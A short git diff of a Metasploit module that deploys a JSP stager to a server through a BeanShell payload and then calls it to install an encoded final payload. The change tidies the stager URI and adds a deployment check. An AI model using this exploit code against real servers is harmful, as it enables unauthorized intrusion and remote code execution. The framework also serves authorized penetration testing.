@@ -57,6 +57,7 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_status('Deploying stager...')
       stager_name = Rex::Text.rand_text_alpha(rand(8..15))
+      stager_uri = normalize_uri(stager_name, "#{stager_name}.jsp")
       stager_contents = stager_jsp(app_base)
       opts = {
         dir: "#{stager_name}.war",
@@ -66,7 +67,9 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     bsh_payload = generate_bsh(:create, opts)
-    package = deploy_bsh(bsh_payload)
+    package = deploy_bsh(bsh_payload) do
+      bsh_stager_deployed?(stager_uri)
+    end
 
     if package.nil?
       print_error('Deployment failed')
@@ -78,7 +81,6 @@ class MetasploitModule < Msf::Auxiliary
     return if http_verb == 'POST'
 
     # call the stager to deploy our real payload war
-    stager_uri = '/' + stager_name + '/' + stager_name + '.jsp'
     payload_data = "#{Rex::Text.rand_text_alpha(rand(8..15))}=#{Rex::Text.uri_encode(encoded_payload)}"
     print_status("Calling stager #{stager_uri} to deploy final payload...")
     res = deploy(
